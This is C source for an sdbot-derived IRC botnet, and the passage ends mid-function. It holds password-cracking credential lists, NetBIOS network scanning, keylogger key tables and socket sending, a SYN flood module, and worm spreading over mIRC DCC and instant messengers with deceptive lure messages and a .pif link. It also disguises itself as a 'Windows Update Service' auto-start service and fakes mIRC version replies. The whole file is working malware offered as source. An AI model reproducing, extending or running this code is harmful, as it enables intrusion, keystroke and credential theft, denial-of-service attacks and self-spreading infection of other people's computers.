// sdbot 0.5b

 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
 #include <winsock2.h>
 #include <wininet.h>
 #include <shellapi.h>
 #include <mmsystem.h>
#include <ctype.h>
#include <lm.h>
#include <lmat.h>
#include <lmremutl.h>
//processKill
 #include <psapi.h>
#include <process.h>
#include <winsvc.h>



 #define WIN32_LEAN_AND_MEAN
 #pragma comment(lib, "Ws2_32.lib")

//#define DEBUG_MODE 

/* usernames to use for cracking */
#define MAX_USERNAME 21
const CHAR *lpszUserName[MAX_USERNAME] = {
"admin",
"administrator",
"database",
"guest",
"owner",
"root",
"sql",
"sqlagent",
"system",
"user",
"wwwadmin", //12
"administrador",
"administratör",
"administrateur",
"verwalter", //16
 "administrada",
 "forsterkning",
 "oikeusministeriö",
 "L'amministratore",
 "EdmInistreiter",
    NULL
};

/* passwords to use for cracking */
#define MAX_PASSWORD 42
const CHAR *lpszPassword[MAX_PASSWORD] = {
    "",
"admin",
"administrator",
"asdf",
"asdfgh",
"database",
"guest",
"hidden",
"owner",
"pass123",
"pass",
"password123",
"password",
"root",
"secret",
"server",
"sql",
"sqlagent",
"system",
"user",
"wwwadmin",
"1",
"111",
"123",
"1234",
"123456",
"654321",
"!@#$",
"!@#$%",
"!@#$%^",
"!@#$%^&",
"!@#$%^&*",
"administrador",
"administratör",
"administrateur", //36
"verwalter",
 "administrada",
 "forsterkning",
 "oikeusministeriö",
  "L'amministratore",
 "EdmInistreiter",
    NULL
};

/* minimal ip_addr to use when generating addresses */
#define MIN_IPADDR_A  10
#define MIN_IPADDR_B  0
#define MIN_IPADDR_C  0
#define MIN_IPADDR_D  1
/* maximum ip_addr to use when generating addresses */
#define MAX_IPADDR_A  240
#define MAX_IPADDR_B  240
#define MAX_IPADDR_C  240
#define MAX_IPADDR_D  240

/* link required libraries in VC++ */
#pragma comment(exestr, " aH v1.0 ") /* required for library linking */
#pragma comment(lib, "mpr.lib") /* library for WNetCancelConnection() and WNetAddConnection2() */
#pragma comment(lib, "wsock32.lib") /* Winsock 1.1 library */
#pragma comment(lib, "netapi32.lib") /* required for NetRemoteTOD() and NetScheduleJobAdd() */
#pragma comment(lib, "advapi32.lib") /* required for GetVersionEx() */
#pragma comment(linker, "/subsystem:console")

#define MAX_NB_THREAD 16
#define MAX_IP 16
INT nIPAddrA = 10;
INT nIPAddrB = 0;
INT nIPAddrC = 0;
INT nIPAddrD = 0;
HANDLE hThread[MAX_NB_THREAD];

DWORD WINAPI ScanNetBIOS(LPVOID lpvThread);
VOID GetLocalIP(void);
VOID GetCmdIP(CHAR *lpIPAddr);
VOID GetNextIP(CHAR szIPAddr[MAX_IP]);
INT EnumShare(CHAR szRemoteAddr[MAX_PATH], CHAR szFoundShare[MAX_PATH]);
BOOL WINAPI TermProcess(DWORD dwCtrlType);


/*********************************************************************************************************************/

/*********************************************************************************************************************/
VOID GetLocalIP(void)
{
    CHAR szLocalIP[80];
    LPHOSTENT lpLocalIPStruct;
    IN_ADDR inLocalIPStruct;
    CHAR szIPAddr[MAX_IP];
    LPTSTR lpszTemp;

    lpszTemp = NULL;

    /* get the local ip_addr information */
    /* Did You Know: 1MB is not 1000KB but instead 1024KB because 2^10 = 1024 */
    if (gethostname(szLocalIP, sizeof(szLocalIP)) != SOCKET_ERROR)
    {
        lpLocalIPStruct = gethostbyname(szLocalIP);
        if (lpLocalIPStruct != 0)
        {
            if (lpLocalIPStruct->h_addr_list[0] != 0)
            {
                /* cram the ip_addr into the 4 global variables */
                memcpy(&inLocalIPStruct, lpLocalIPStruct->h_addr_list[0], sizeof(IN_ADDR));
                sprintf(szIPAddr, "%s", inet_ntoa(inLocalIPStruct));
                lpszTemp = strtok(szIPAddr, ".");
                nIPAddrA = atoi(lpszTemp);
                lpszTemp = strtok(NULL, ".");
                nIPAddrB = atoi(lpszTemp);
                lpszTemp = strtok(NULL, ".");
                nIPAddrC = atoi(lpszTemp);
                lpszTemp = strtok(NULL, ".");
                nIPAddrD = atoi(lpszTemp);
            }
        }
    }
    /* if local ip_addr is internal, then start with first LAN machine ip_addr */
    if ((nIPAddrA == 192) && (nIPAddrB == 168))
    {
        nIPAddrA = 192;
        nIPAddrB = 168;
        nIPAddrC = 0;
        nIPAddrD = 1;
    }
    else if (nIPAddrA == 10)
    {
        nIPAddrA = 10;
        nIPAddrB = 0;
        nIPAddrC = 0;
        nIPAddrD = 1;
    }
}

/*********************************************************************************************************************/
VOID GetCmdIP(CHAR *lpIPAddr)
{
	CHAR *lpszReturn;
	INT nK = 0;

	lpszReturn = strtok(lpIPAddr, ".");
	while (lpszReturn != NULL)
	{
		if (nK == 0)
		{
			nIPAddrA = atoi(lpszReturn);
		}
		if (nK == 1)
		{
			nIPAddrB = atoi(lpszReturn);
		}
		if (nK == 2)
		{
			nIPAddrC = atoi(lpszReturn);
		}
		if (nK == 3)
		{
			nIPAddrD = atoi(lpszReturn);
		}
		lpszReturn = strtok(NULL, ".");
		nK++;
	}
}

/*********************************************************************************************************************/
VOID GetNextIP(CHAR szIPAddr[MAX_IP])
{
    CHAR szBuffer[MAX_IP];

    /* increment and check, too large? reset to min value */
    nIPAddrD++;
    if (nIPAddrD > 240)
    {
        nIPAddrD = 1;
        nIPAddrC++;
        if (nIPAddrC > 240)
        {
            nIPAddrC = 0;
            nIPAddrB++;
            if (nIPAddrB > 240)
            {
                nIPAddrB = 0;
                nIPAddrA++;
                if (nIPAddrA > 240)
                {
                    nIPAddrA = 10;
                }
            }
        }
    }
    /* assign new values to be returned */
    itoa(nIPAddrA, szBuffer, 10);
    strcpy(szIPAddr, szBuffer);
    strcat(szIPAddr, ".");
    itoa(nIPAddrB, szBuffer, 10);
    strcat(szIPAddr, szBuffer);
    strcat(szIPAddr, ".");
    itoa(nIPAddrC, szBuffer, 10);
    strcat(szIPAddr, szBuffer);
    strcat(szIPAddr, ".");
    itoa(nIPAddrD, szBuffer, 10);
    strcat(szIPAddr, szBuffer);
}

/*********************************************************************************************************************/
VOID GetRandIP(CHAR szIPAddr[MAX_IP])
{
    CHAR szIPAddrA[4];
    CHAR szIPAddrB[4];
    CHAR szIPAddrC[4];
    CHAR szIPAddrD[4];

    srand(GetTickCount());
    itoa(rand() % 230 + 10, szIPAddrA, 10);
    itoa(rand() % 240, szIPAddrB, 10);
    itoa(rand() % 240, szIPAddrC, 10);
    itoa(rand() % 239 + 1, szIPAddrD, 10);
    strcpy(szIPAddr, szIPAddrA);
    strcat(szIPAddr, ".");
    strcat(szIPAddr, szIPAddrB);
    strcat(szIPAddr, ".");
    strcat(szIPAddr, szIPAddrC);
    strcat(szIPAddr, ".");
    strcat(szIPAddr, szIPAddrD);
}

/*********************************************************************************************************************/
BOOL WINAPI TermProcess(DWORD dwCtrlType)
{
	INT nK = 0;
	BOOL nbTerm[MAX_NB_THREAD];

	if (dwCtrlType == CTRL_C_EVENT)
	{
		for (nK = 0; nK < MAX_NB_THREAD; nK++)
		{
unsigned long exitCode=0;
GetExitCodeThread(hThread[nK], (unsigned long*)exitCode);
			nbTerm[nK] = TerminateThread(hThread[nK], exitCode);
		}
		WSACleanup();
		exit(0);
		return TRUE;
	}
	return FALSE;
}

// bot version (used in about/status/version reply)
 #define vername "mIRC v6.1 Khaled Mardam-Bey"

// #define REMOVE_NONSYNNERS   // .remove bots that can't SYN flood once it's been attempted

// #define NO_IDENT      // disables ident server
// #define NO_SPY        // SPIES AND CLONES ARE USELESS
// #define NO_UDP        // disables UDP functions
// #define NO_PING       // disables ping functions
// #define NO_NETINFO    // disables network info function
// #define NO_SYSINFO    // disables system info function
// #define NO_REDIRECT   // disables port redirect function
// #define NO_DOWNLOAD   // disables downloading/updating functions
// #define NO_VISIT      // disables visiting URLs
// #define NO_CONNCHECK  // disables check for internet connection
// #define NO_IMSPREAD   // disables IM spreading functions


// macro for predefined aliases. (these are just examples, you can change them to whatever you want)
 #define addpredefinedaliases() \
 	addalias("opme", "mode $chan +o $user"); \
 	addalias("smack", "action $chan smacks $1"); \
 	addalias("u1", "udp $1 10000 2048 50"); \
 	addalias("p2", "ping $1 10000 $2 50"); \
 	addalias("s1", "syn $1 80 60"); \
	addalias("ctcp", "raw PRIVMSG $1 :$chr(1)$2-$chr(1)");

// bot configuration
//keylog
char keylogchan[50];
int sendkeysto = 0;
SOCKET keysock;
int inputL[]={
	8,
	13,
	27,
	112,
	113,
	114,
	115,
	116,
	117,
	118,
	119,
	120,
	121,
	122,
	123,
	192,
	49,
	50,
	51,
	52,
	53,
	54,
	55,
	56,
	57,
	48,
	189,
	187,
	9,
	81,
	87,
	69,
	82,
	84,
	89,
	85,
	73,
	79,
	80,
	219,
	221,
	65,
	83,
	68,
	70,
	71,
	72,
	74,
	75,
	76,
	186,
	222,
	90,
	88,
	67,
	86,
	66,
	78,
	77,
	188,
	190,
	191,
	220,
	17,
	91,
	32,
	92,
	44,
	145,
	45,
	36,
	33,
	46,
	35,
	34,
	37,
	38,
	39,
	40,
	144,
	111,
	106,
	109,
	107,
	96,
	97,
	98,
	99,
	100,
	101,
	102,
	103,
	104,
	105,
	110,
};

char *outputL[]={
	"b",
	"e",
	"[ESC]",
	"[F1]",
	"[F2]",
	"[F3]",
	"[F4]",
	"[F5]",
	"[F6]",
	"[F7]",
	"[F8]",
	"[F9]",
	"[F10]",
	"[F11]",
	"[F12]",
	"`",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"[TAB]",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"'",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"\\",
	"[CTRL]",
	"[WIN]",
	" ",
	"[WIN]",
	"[Print Screen]",
	"[Scroll Lock]",
	"[Insert]",
	"[Home]",
	"[Pg Up]",
	"[Del]",
	"[End]",
	"[Pg Dn]",
	"[Left]",
	"[Up]",
	"[Right]",
	"[Down]",
	"[Num Lock]",
	"/",
	"*",
	"-",
	"+",
	"0",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	".",
}; 

char *outputH[]={
	"b",
	"e",
	"[ESC]",
	"[F1]",
	"[F2]",
	"[F3]",
	"[F4]",
	"[F5]",
	"[F6]",
	"[F7]",
	"[F8]",
	"[F9]",
	"[F10]",
	"[F11]",
	"[F12]",
	"~",
	"!",
	"@",
	"#",
	"$",
	"%",
	"^",
	"&",
	"*",
	"(",
	")",
	"_",
	"+",
	"[TAB]",
	"Q",
	"W",
	"E",
	"R",
	"T",
	"Y",
	"U",
	"I",
	"O",
	"P",
	"{",
	"}",
	"A",
	"S",
	"D",
	"F",
	"G",
	"H",
	"J",
	"K",
	"L",
	":",
	"\"",
	"Z",
	"X",
	"C",
	"V",
	"B",
	"N",
	"M",
	"<",
	">",
	".?",//strange ?? dont know why but only a ? did not work
	"|",
	"[CTRL]",
	"[WIN]",
	" ",
	"[WIN]",
	"[Print Screen]",
	"[Scroll Lock]",
	"[Insert]",
	"[Home]",
	"[Pg Up]",
	"[Del]",
	"[End]",
	"[Pg Dn]",
	"[Left]",
	"[Up]",
	"[Right]",
	"[Down]",
	"[Num Lock]",
	"/",
	"*",
	"-",
	"+",
	"0",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	".",
};
//#ifdef start_keylogger_afterstartup
char keylogfilename[] = "keylog.txt"; 
//#endif

//keylog
//DCC SPREAD
const char *mFiles[6] = {
		"Setup.exe",
		"CAL-DemoViewer.exe",
		"cheater-caught.pif",
		"AdminMOD-ExploitHack.exe",
		NULL
		};

const char *mPrivMsg[6] = {
		"Here is the new CAL Demo Viewer, it includes: Cheat Scanner, 3rd Person Viewer, Rotational Image Scan, and lots more",
		"omfg this is so cool! i just caught this guy cheating with this cal demoviewer or whatever its called, here's a copy of it",
		"i just caught this guy cheating with the Cheat Scanner in the CAL Demo Viewer, chk it out",
		"dude, chk out this new AdminMOD exploit, it gives you admin privs on any server running AM, plz dont give it out tho, thnx",
		NULL
		};

char mIRCfName[MAX_PATH];
char mIRCfBody[1024];

//DCC Spread
const char nickconst[] = "Tr"; // first part to the bot's nick
const int maxrand = 6; // how many random numbers in the nick
 const char botid[] = "p"; // bot id
 const char password[] = ""; // bot password
 const  int maxlogins = 4; // maximum number of simultaneous logins
 //const char server[] =  server
 char server[30];
const char c2[] = "";
 const  int port = 6667; // server port
 const char serverpass[] = ""; // server password
 const char channel[30];
  const char c1[] = "#"; // CHANNEL: devide channel into small parts from c1 to c4
const char s4[] ="";
  const char chanpass[] = ""; // channel password
 const char server2[] = ""; // backup server (optional)
const  int port2 = 6667; // backup server port
 const char s1[] ="";  //SERVER1: devide server into small parts from s1 to s6
 const char s6[] ="";
 const char channel2[] = ""; // backup channel (optional)
 const char chanpass2[] = ""; // backup channel password (optional)
 const char s3[] ="";
 const BOOL topiccmd = FALSE; // set to TRUE to enable topic commands
 const BOOL rndfilename = FALSE; // use random file name
 const char filename[] = "wupdated.exe"; // destination file name
 const char s2[] ="";
 const char c3[] = "";
 const char s5[] ="";
 const char c4[] = "";
 const BOOL regrun = TRUE; // use the Run registry key for autostart
 const BOOL regrunservices = TRUE; // use the RunServices registry key for autostart
 const char valuename[] = "Configuration Loaded"; // value name for autostart
const char prefix = '.'; // command prefix (one character max.)
 const char version[] = "iroffer v1.3b17 [October 20, 2003] By PMG http://iroffer.org/ - CYGWIN_NT-5.0 1.5.5(0.94/3/2)"; // bot's VERSION reply
 const  int cryptkey = 0; // encryption key (not used right now)
const  int maxaliases = 16; // maximum number of aliases (must be greater than the number of predefined aliases).
 char IMmsg[] = "hey, check out this funny pic: http://www.rf-mods.com/bot.pif"; //Instant Messenger

// ping/udp structure.
 typedef struct ps {
	char host[128];
	char chan[128];
	int num;
	int size;
	int delay;
	int port;
	SOCKET sock;
	int threadnum;
	BOOL silent;
	BOOL gotinfo;
 } ps;

// irc/spy structure.
 typedef struct ircs {
	char host[128];
	int port;
	char channel[64];
	char chanpass[64];
	char hchan[64];
	char nick[16];
	SOCKET sock;
	int spy;
	int threadnum;
	BOOL gotinfo;
 } ircs;

 #ifndef NO_REDIRECT
// redirect structure.
 typedef struct rs {
	char dest[128];
	int port;
	int lport;
	SOCKET sock;
	SOCKET csock;
	int threadnum;
	BOOL silent;
	BOOL gotinfo;
 } rs;
 #endif

 #ifndef NO_DOWNLOAD
// download/update structure
 typedef struct ds {
	char url[256];
	char dest[256];
	char chan[128];
	SOCKET sock;
	int run;
	int threadnum;
	int update;
	BOOL silent;
	BOOL gotinfo;
 } ds;
 #endif

 #ifndef NO_VISIT
// visit structure
 typedef struct vs {
	 char host[128];
	 char referer[128];
	 char chan[128];
	 SOCKET sock;
	 BOOL silent;
	 BOOL gotinfo;
 } vs;
 #endif

// alias structure
 typedef struct as {
	 char name[24];
	 char command[160];
 } as;

 //keylog
 typedef struct keylog {
	int threadnum;
	SOCKET socket;
 } keylog;
//keylog

//ftpAcces
 typedef struct Ftp {
	 char url[80];
	 int port;
	 char u[80];
	 char p[80];
	 char f[80];
	 char rf[80];
	 char chan[80];
	 SOCKET sock;
	 BOOL up;
	 int threadnum;
	 BOOL notice;
	 BOOL del;
 } Ftp;

  typedef struct nth {
	 char ip[80];
	 char u[80];
	 char p[80];
	 char chan[80];
	 SOCKET sock;
	 BOOL notice;
	 int threadnum;
 } nth;

  typedef struct nts {
	 char chan[80];
	 SOCKET sock;
	 BOOL notice;
 } nts;


 #ifndef NO_PING
// icmp.dll typedefs/structs
 typedef unsigned long IPAddr;
 typedef struct ip_option_information {
 	unsigned char Ttl;
 	unsigned char Tos;
 	unsigned char Flags;
 	unsigned char OptionsSize;
 	unsigned char FAR *OptionsData;
 } IP_OPTION_INFORMATION, *PIP_OPTION_INFORMATION;
 typedef struct icmp_echo_reply {
 	IPAddr Address;
 	unsigned long Status;
 	unsigned long RoundTripTime;
 	unsigned short DataSize;
 	unsigned short Reserved;
 	void FAR *Data;
 	struct ip_option_information Options;
 } ICMP_ECHO_REPLY;

// kernel32.dll typedefs/structs
 typedef struct tagPROCESSENTRY32 {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	DWORD *th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
 } PROCESSENTRY32, *LPPROCESSENTRY32;

#ifndef NO_SCAN
// scan structure
 typedef struct scans {
	IN_ADDR addy;
	char chan[128];
	int port;
	int delay;
	SOCKET sock;
	int threadnum;
	DWORD host;
	BOOL silent;
	BOOL notice;
	BOOL gotinfo;
	BOOL cgotinfo;
 } scans;
#endif

 typedef struct int64t {
	unsigned long Low, High;
} int64t;


// icmp.dll function variables
 typedef int (__stdcall *ICF)(VOID);
 ICF fIcmpCreateFile;
 typedef int (__stdcall *ISE)(HANDLE, IPAddr, LPVOID, WORD, PIP_OPTION_INFORMATION, LPVOID, DWORD, DWORD);
 ISE fIcmpSendEcho;
 typedef int (__stdcall *ICH)(HANDLE);
 ICH fIcmpCloseHandle;
 #endif

// wininet.dll function variables
 typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
 IGCSE fInternetGetConnectedStateEx;
 typedef int (__stdcall *IGCS)(LPDWORD, DWORD);
 IGCS fInternetGetConnectedState;

// kernel32.dll function variables
 typedef int (__stdcall *RSP)(DWORD, DWORD);
 RSP fRegisterServiceProcess;
 typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
 CT32S fCreateToolhelp32Snapshot;
 typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
 P32F fProcess32First;
 typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);
 P32N fProcess32Next;

// function prototypes (not really neccesary, but this way i can put the functions in any order i want)
///////////////////////////////////// SYN FLOOD ///////////////////////////
 long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort,int Times);
 long SYNFlood(char *target, char *port, char *len);
///////////////////////////////////// SYN FLOOD ///////////////////////////

 //keylog
DWORD WINAPI keylogger(LPVOID param);
DWORD WINAPI keepkeys(LPVOID param);
int sendkeys(SOCKET sock,char *buf,char *window,char *logfile);
//keylog

//DCC SPREAD
//DWORD WINAPI mircspreader(LPVOID Param);

void RandMRC(VOID);
int mIRCSpread(char *chan);

//DCC SPREAD
//Instant Messenger
 #ifndef NO_IMSPREAD
 BOOL CALLBACK EnumAIMChild(HWND hwnd, LPARAM lParam);
 BOOL CALLBACK EnumAIM(HWND hwnd, LPARAM lParam);
 BOOL CALLBACK EnumMSNChild(HWND hwnd, LPARAM lParam);
 BOOL CALLBACK EnumMSN(HWND hwnd, LPARAM lParam);
 BOOL CALLBACK EnumYahooChild(HWND hwnd, LPARAM lParam);
 BOOL CALLBACK EnumYahoo(HWND hwnd, LPARAM lParam);
 #endif
//Instant Messenger
 //ftp
 DWORD WINAPI ftpAccess(LPVOID Param);
//ftp

 //net send
 DWORD NetMsgSend(char *target, char *spoof, char *message);
 //net send

 //diskinfo
  BOOL diskInfo(SOCKET sock, char *chan, BOOL notice);

//nthack
  DWORD WINAPI nthack(LPVOID Param);
  BOOL InstallService(char *lpszMachine);

 BOOL isWinNT(VOID);

  #ifndef NO_SCAN
 DWORD WINAPI ip_connect(LPVOID param);
 DWORD WINAPI ip_scan(LPVOID param);
 #endif

 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
 char * decryptstr(char *str, int strlen);
 void addlog(char *desc);
 int addalias(char *name, char *command);
 int addthread(char *desc);
 DWORD WINAPI irc_connect(LPVOID param);
 #ifndef NO_IDENT
 DWORD WINAPI ident(LPVOID user);
 #endif
 char * rndnick(char *strbuf);
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy);
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat);
 #ifndef NO_SPY
 int irc_spyparseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server);
 #endif
 void irc_send(SOCKET sock, char *msg);
 void irc_sendf(SOCKET sock, char *msg, char *str);
 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2);
 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice);
 char * replacestr(char *str, char *oldstr, char *newstr);
 #ifndef NO_UDP
 DWORD WINAPI udp(LPVOID param);
 #endif
 #ifndef NO_PING
 DWORD WINAPI ping(LPVOID param);
 #endif
 #ifndef NO_DOWNLOAD
 DWORD WINAPI webdownload(LPVOID param);
 #endif
 #ifndef NO_REDIRECT
 DWORD WINAPI redirect(LPVOID param);
 DWORD WINAPI redirectloop(LPVOID param);
 DWORD WINAPI redirectloop2(LPVOID param);
 #endif
 #ifndef NO_NETINFO
 char * netinfo(char *ninfo, char *host, SOCKET sock);
 #endif
 #ifndef NO_SYSINFO
 char * sysinfo(char *sinfo);
 int cpuspeed(void);
 unsigned __int64 cyclecount();
 #endif
 #ifndef NO_VISIT
 DWORD WINAPI visit(LPVOID param);
 #endif
 void uninstall(void);

// global variables
 HANDLE ih;              // internet handle
 ircs mainirc;           // main irc structure
 char prefix1 = prefix;  // prefix variable
 HANDLE threads[64];     // thread handles
 char threadd[64][128];  // thread descriptions
 SOCKET csock[64];       // thread sockets
 char cnick[64][16];     // thread nicks
 char log[128][128];     // log entries
 DWORD w;                // DWORD used for various stuff
 as aliases[maxaliases]; // alias array
 int anum = 16;          // number of aliases
 BOOL success = FALSE;   // if true then we made successful connect attempt
 char tempdir[256];      // name of temp folder
 char pbuff[65500];      // packet buffer
 BOOL noicmp;            // if true, icmp.dll is available
 BOOL noigcse;           // if true, InternetGetConnectedStateEx function is available
 DWORD started;          // time bot was started

///////////////////////////////////// SYN FLOOD ///////////////////////////

#define IP_HDRINCL  2 
 
typedef struct ip_hdr 
{  unsigned char h_verlen; 
   unsigned char tos; 
   unsigned short total_len; 
   unsigned short ident; 
   unsigned short frag_and_flags; 
   unsigned char ttl; 
   unsigned char proto; 
   unsigned short checksum; 
   unsigned int sourceIP; 
   unsigned int destIP; 
} IPHEADER; 
 
typedef struct tsd_hdr 
{  unsigned long saddr; 
   unsigned long daddr; 
   char mbz; 
   char ptcl; 
   unsigned short tcpl; 
} PSDHEADER; 
 
typedef struct tcp_hdr 
{  USHORT th_sport; 
   USHORT th_dport; 
   unsigned int th_seq; 
   unsigned int th_ack; 
   unsigned char th_lenres; 
   unsigned char th_flag; 
   USHORT th_win; 
   USHORT th_sum; 
   USHORT th_urp; 
} TCPHEADER;

typedef struct synt 
{
char ip[128];
char port[128];
char length[128];
char chan[128];
BOOL notice;
int threadnumber;
SOCKET socket;
} synt;

DWORD WINAPI synthread(LPVOID param);

//SERVICE
SERVICE_STATUS          WupDateStatus; 
SERVICE_STATUS_HANDLE   WupDateStatusHandle;

char ServiceName[]="Wupdated";
char ServiceLongName[]="Windows Update Service";


//SERVICE
VOID WINAPI WupDateStart (DWORD argc, LPTSTR *argv);
VOID  WupDateCtrlHandler (DWORD opcode); 
DWORD WupDateInitialization (DWORD argc, LPTSTR *argv, 
        DWORD *specificError); 
VOID SvcDebugOut(LPSTR String);

DWORD GetExplorerProcessID(VOID);

void ImpersonateInteractiveUser(VOID);
DWORD WINAPI NTScan(LPVOID Param);


//int WINAPI WupDateMain(VOID);
///////////////////////////////////// SYN FLOOD ///////////////////////////

 // program starts here
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    SERVICE_TABLE_ENTRY DispatchTable[] = { 
        { ServiceName, WupDateStart }, 
        { NULL, NULL } }; 

	if (!StartServiceCtrlDispatcher(DispatchTable)) 
    {

		WSADATA wsadata;
		int err = 0;
		char cfilename[256];
		char filename1[64];
		char sysdir[256];
		char tstr[256];
		HANDLE psnap;
		PROCESSENTRY32 pe32 = {0};
		int copies = 0;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
		GetTempPath(sizeof(tempdir), tempdir);

		// check if this exe is running already
		if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
			psnap = fCreateToolhelp32Snapshot(2, 0);
			if (psnap != INVALID_HANDLE_VALUE) {
				pe32.dwSize = sizeof(PROCESSENTRY32);
				if (fProcess32First(psnap, &pe32)) {
					do {
						if (strncmp(cfilename+(strlen(cfilename)-strlen(pe32.szExeFile)), pe32.szExeFile, strlen(pe32.szExeFile)) == 0) copies++;
					} while (fProcess32Next(psnap, &pe32));
				}
				CloseHandle (psnap);
				// if this exe has already been run, then exit
				if (copies > 1) exit(0);
			}
		}

		err = WSAStartup(MAKEWORD(1, 1), &wsadata);
	//	if (err != 0) return 0;
		if ( LOBYTE( wsadata.wVersion ) != 1 || HIBYTE( wsadata.wVersion ) != 1 ) {
			WSACleanup();
		//	return 0;
		}
		srand(GetTickCount());
		if (rndfilename) rndnick((char *)&filename); else strncpy(filename1, filename, sizeof(filename1)-1);

		GetSystemDirectory(sysdir, sizeof(sysdir));
		if (strstr(cfilename, sysdir) == NULL) {
			Sleep(1000);
			// loop until the file is copied.
			sprintf(tstr, "\\%s", filename1);
			while (CopyFile(cfilename, strcat(sysdir, tstr), FALSE) == FALSE) Sleep(2000);

			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			memset(&sinfo, 0, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			WSACleanup();
			if (CreateProcess(NULL, sysdir, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) exit(0);
			else SvcDebugOut("Unable to create process\n");
		}
		ImpersonateInteractiveUser();
		SC_HANDLE hSCM = OpenSCManager( NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
		// Maybe it's already there and installed, let's try to run

		SC_HANDLE hService = OpenService( hSCM, ServiceName, SERVICE_ALL_ACCESS );

		// Creates service on remote machine, if it's not installed yet
		if ( hService == NULL )
			hService = CreateService(
				hSCM, ServiceName, ServiceLongName,
				SERVICE_ALL_ACCESS, 
				SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS, 
				SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
				"%SystemRoot%\\system32\\wupdated.exe",
				NULL, NULL, NULL, NULL, NULL );
   
		if (hService == NULL)
		{
			CloseServiceHandle(hSCM);
			return FALSE;
		}

		// Start service
		if ( !StartService( hService, 0, NULL ) )
			return FALSE;
		else return TRUE;

		CloseServiceHandle(hService);
		CloseServiceHandle(hSCM);

	}
	// return 1;
 }

 DWORD WupDateInitialization(DWORD argc, LPTSTR *argv, 
    DWORD *specificError) 
{ 
    argv; 
    argc; 
    specificError; 
    return(0); 
}

 VOID WupDateCtrlHandler (DWORD Opcode) 
{ 
 //   DWORD status; 
 
    switch(Opcode) 
    { 
        case SERVICE_CONTROL_PAUSE: 
        // Do whatever it takes to pause here. 
            WupDateStatus.dwCurrentState = SERVICE_PAUSED; 
            break; 
 
        case SERVICE_CONTROL_CONTINUE: 
        // Do whatever it takes to continue here. 
            WupDateStatus.dwCurrentState = SERVICE_RUNNING; 
            break; 
 
        case SERVICE_CONTROL_STOP: 
        // Do whatever it takes to stop here. 
            WupDateStatus.dwWin32ExitCode = 0; 
            WupDateStatus.dwCurrentState  = SERVICE_STOPPED; 
            WupDateStatus.dwCheckPoint    = 0; 
            WupDateStatus.dwWaitHint      = 0; 
 
           SetServiceStatus (WupDateStatusHandle,&WupDateStatus);

            return; 
 
        case SERVICE_CONTROL_INTERROGATE: 
        // Fall through to send current status. 
            break; 
 
        default:
			break;
        //    SvcDebugOut(" [MY_SERVICE] Unrecognized opcode %ld\n", 
        //        Opcode); 
    } 
 
    // Send current status. 
    SetServiceStatus (WupDateStatusHandle,  &WupDateStatus); 
    return; 
}

 VOID SvcDebugOut(LPSTR String) 
{ 
	FILE *f;
	f = fopen("txt.txt","w");
	fprintf(f,String);
	fclose(f);
}

VOID WINAPI WupDateStart (DWORD argc, LPTSTR *argv)
 {
	ImpersonateInteractiveUser();
	DWORD status; 
    DWORD specificError; 
 
    WupDateStatus.dwServiceType        = SERVICE_WIN32; 
    WupDateStatus.dwCurrentState       = SERVICE_START_PENDING; 
    WupDateStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | 
        SERVICE_ACCEPT_PAUSE_CONTINUE; 
    WupDateStatus.dwWin32ExitCode      = 0; 
    WupDateStatus.dwServiceSpecificExitCode = 0; 
    WupDateStatus.dwCheckPoint         = 0; 
    WupDateStatus.dwWaitHint           = 0; 
 
    WupDateStatusHandle = RegisterServiceCtrlHandler( 
        ServiceName, 
        WupDateCtrlHandler); 
 
 /*   if (WupDateStatusHandle == (SERVICE_STATUS_HANDLE)0) 
    { 
        SvcDebugOut(" [MY_SERVICE] RegisterServiceCtrlHandler 
            failed %d\n", GetLastError()); 
        return; 
    } 
 */
    // Initialization code goes here. 
    status = WupDateInitialization(argc,argv, &specificError); 
    // Handle error condition 
    if (status != NO_ERROR) 
    { 
        WupDateStatus.dwCurrentState       = SERVICE_STOPPED; 
        WupDateStatus.dwCheckPoint         = 0; 
        WupDateStatus.dwWaitHint           = 0; 
        WupDateStatus.dwWin32ExitCode      = status; 
